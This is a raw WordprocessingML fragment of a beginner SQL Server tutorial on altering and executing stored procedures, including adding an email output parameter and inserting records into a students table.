          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>is used to write comments in one or multiple lines</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>is used to write a comment in a single line</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How to Alter a Stored Procedure in a SQL Server</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In SQL Server, a stored procedure can be modified with the help of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Alter</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>keyword</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. Now if we want to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>student</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>email address through the same procedure</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>GetstudentnameInOutputVariable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. So we need to modify it by adding one more output parameter "</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>StudentEmail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is shown below:</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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">Stored Procedure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>GetstudentnameInOutputVariable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> is modified to collect the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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> address of the student with the help of the Alert Keyword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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>*/</w:t>
      </w:r>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hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Alter</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PROCEDURE</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GetstudentnameInOutputVariable</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w:t>
      </w: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--Input </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>parameter ,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Studentid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the student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VARCHAR</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>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 xml:space="preserve">) OUT,    </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>-- Output parameter to collect the student name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VARCHAR</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>200</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)OUT</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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Output Parameter to collect the student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lastRenderedPageBreak/>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SELECT</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 '</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StudentEmail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">=email </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman"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WHERE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studentid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studentid</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END</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Note</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: It is not necessary that a stored procedure will have to return. There can be a </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>case</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> when a stored procedure doesn't returns anything. For example, a stored procedure can be used to</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Insert</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</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delete</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a SQL statement. For example, the below stored procedure is used to</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insert</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">value into the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>table</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>tbl_students</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">This Stored procedure is used to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Insert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> value into the table </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>tbl_students</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>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comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>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Procedure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InsertStudentrecord</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StudentFirstName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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StudentLastName</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hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Varchar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>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50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tbl_Students</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Firstname</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lastname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, Email)</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gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman"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StudentFirstName</w:t>
      </w:r>
      <w:proofErr w:type="spell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StudentLastName</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End</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Execution of the Stored Procedure in SQL Server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
        </w:rPr>
        <w:t>Execution of the Stored Procedure which doesn't have an Output Parameter</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A stored procedure is used in the SQL Server with the help of the "</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>" or "</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Exec</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>" Keyword. For example, if we want to execute the stored procedure "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Getstudentname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>", then we will use the following statement.</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Execute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w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1</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Exec</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w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
